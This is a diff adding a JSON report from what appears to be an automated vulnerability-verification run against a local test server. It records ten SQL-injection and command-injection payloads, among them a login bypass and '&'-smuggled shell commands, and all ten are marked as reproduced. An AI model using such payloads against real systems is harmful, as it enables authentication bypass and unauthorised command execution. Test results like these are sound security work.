@@ -1,0 +1,114 @@
+{
+  "summary": {
+    "marker": "VF_MARKER_GGQCCH",
+    "generated_at": "2026-11-17T11:51:25+00:00",
+    "base": "http://127.0.0.1:5055",
+    "tested": 10,
+    "reproduced": 10,
+    "in_ground_truth_scope": 10,
+    "reproduced_in_scope": 10,
+    "not_reproduced": []
+  },
+  "results": [
+    {
+      "target_id": "TGT-001",
+      "route": "/user",
+      "method": "GET",
+      "payload": "uid=1' OR '1'='1",
+      "baseline": "200 rows=1",
+      "attack": "200 rows=2",
+      "verdict": "REPRODUCED",
+      "reason": "行数 1 -> 2（注入后返回全表即成立）"
+    },
+    {
+      "target_id": "TGT-002",
+      "route": "/login",
+      "method": "POST",
+      "payload": "username=alice' OR '1'='1'-- -",
+      "baseline": "200 matched=0",
+      "attack": "200 matched=2",
+      "verdict": "REPRODUCED",
+      "reason": "matched 0 -> 2（错误口令仍匹配即绕过认证）"
+    },
+    {
+      "target_id": "TGT-003",
+      "route": "/search",
+      "method": "GET",
+      "payload": "q=' OR '1'='1' --",
+      "baseline": "200 rows=0",
+      "attack": "200 rows=2",
+      "verdict": "REPRODUCED",
+      "reason": "行数 0 -> 2"
+    },
+    {
+      "target_id": "TGT-004",
+      "route": "/order",
+      "method": "GET",
+      "payload": "order_id=0 OR 1=1",
+      "baseline": "200 rows=1",
+      "attack": "200 rows=2",
+      "verdict": "REPRODUCED",
+      "reason": "行数 1 -> 2"
+    },
+    {
+      "target_id": "TGT-005",
+      "route": "/report",
+      "method": "GET",
+      "payload": "day=' OR '1'='1' --",
+      "baseline": "200 count=0",
+      "attack": "200 count=2",
+      "verdict": "REPRODUCED",
+      "reason": "COUNT 0 -> 2"
+    },
+    {
+      "target_id": "TGT-006",
+      "route": "/profile",
+      "method": "GET",
+      "payload": "id=0 OR 1=1",
+      "baseline": "200 rows=1",
+      "attack": "200 rows=2",
+      "verdict": "REPRODUCED",
+      "reason": "行数 1 -> 2"
+    },
+    {
+      "target_id": "TGT-007",
+      "route": "/ping",
+      "method": "GET",
+      "payload": "host=127.0.0.1 & echo VF_MARKER_GGQCCH",
+      "baseline": "200 marker=False",
+      "attack": "200 marker=True",
+      "verdict": "REPRODUCED",
+      "reason": "响应中出现哨兵串即证明命令被执行"
+    },
+    {
+      "target_id": "TGT-008",
+      "route": "/convert",
+      "method": "GET",
+      "payload": "name=x & exit 0",
+      "baseline": "200 exit=4",
+      "attack": "200 exit=0",
+      "verdict": "REPRODUCED",
+      "reason": "退出码 4 -> 0（exit 0 被执行说明 & 后被当作命令）"
+    },
+    {
+      "target_id": "TGT-009",
+      "route": "/backup",
+      "method": "GET",
+      "payload": "folder=data & echo VF_MARKER_GGQCCH",
+      "baseline": "200 marker=False",
+      "attack": "200 marker=True",
+      "verdict": "REPRODUCED",
+      "reason": "响应中出现哨兵串即证明命令被执行"
+    },
+    {
+      "target_id": "TGT-010",
+      "route": "/deploy",
+      "method": "POST",
+      "payload": "env=staging & echo VF_MARKER_GGQCCH",
+      "baseline": "200 marker=False",
+      "attack": "200 marker=True",
+      "verdict": "REPRODUCED",
+      "reason": "stdout 中出现哨兵串即证明命令被执行"
+    }
+  ]
+}
